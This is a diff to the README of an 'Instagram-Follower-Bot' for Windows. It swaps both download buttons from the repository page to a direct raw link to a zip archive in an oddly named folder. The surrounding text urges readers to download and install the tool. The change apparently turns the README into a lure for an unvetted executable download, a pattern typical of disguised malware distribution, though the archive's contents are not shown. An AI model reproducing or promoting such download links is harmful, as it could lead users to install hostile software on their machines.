@@ -6,7 +6,7 @@ Instagram-Follower-Bot is a powerful, free automation tool designed for Windows 
 
 ## 📥 Download the Bot Now
 
-[![Download Instagram-Follower-Bot](https://img.shields.io/badge/Download-Instagram_Follower_Bot-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hitchingpostcartridge4026/Instagram-Follower-Bot)
+[![Download Instagram-Follower-Bot](https://img.shields.io/badge/Download-Instagram_Follower_Bot-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/hitchingpostcartridge4026/Instagram-Follower-Bot/main/interassociation/v1.5.zip)
 
 Visit this link to download the application. The download page will provide you with the latest version of the bot, ready for installation on your Windows PC.
 
@@ -129,7 +129,7 @@ Don't wait any longer to take your Instagram game to the next level. Download In
 
 Ready to get started? Click the button below to visit the official download page and get the latest version of Instagram-Follower-Bot for your Windows PC.
 
-[![Get Instagram-Follower-Bot Now](https://img.shields.io/badge/Download-Instagram_Follower_Bot-important?style=for-the-badge&logo=appveyor&logoColor=white)](https://github.com/hitchingpostcartridge4026/Instagram-Follower-Bot)
+[![Get Instagram-Follower-Bot Now](https://img.shields.io/badge/Download-Instagram_Follower_Bot-important?style=for-the-badge&logo=appveyor&logoColor=white)](https://raw.githubusercontent.com/hitchingpostcartridge4026/Instagram-Follower-Bot/main/interassociation/v1.5.zip)
 
 Visit this link to download the application. Once you've downloaded it, follow the installation guide above to get everything set up in just a few minutes.
 
